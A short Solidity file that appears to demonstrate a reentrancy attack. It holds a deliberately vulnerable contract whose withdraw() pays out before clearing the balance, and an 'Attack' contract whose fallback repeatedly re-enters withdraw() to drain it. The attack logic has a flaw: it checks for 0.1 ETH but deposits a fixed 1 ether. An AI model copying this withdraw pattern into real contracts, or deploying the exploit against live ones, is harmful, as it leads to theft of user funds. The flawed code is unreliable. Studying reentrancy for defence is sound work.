// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
//this is a contract where a attacker can attack your contract using external contract 

contract ReentracntVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {  // Removed payable
        uint bal = balances[msg.sender];
        require(bal > 0, "No balance");
        
        // Vulnerable pattern - state change after transfer
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send");
        
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
}

contract Attack {
    ReentracntVulnerable public reentrancy;

    constructor(address _reentrancyAddress) {
        reentrancy = ReentracntVulnerable(_reentrancyAddress);
    }

    // when some will this attack 
    function attack() external payable {
        require(msg.value >= 0.1 ether, "Send at least 0.1 ETH");
        reentrancy.deposit{value: 1 ether}();
        reentrancy.withdraw();
    }

    fallback() external payable {
        if(address(reentrancy).balance >= 0.1 ether) {
            reentrancy.withdraw();
        }
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
}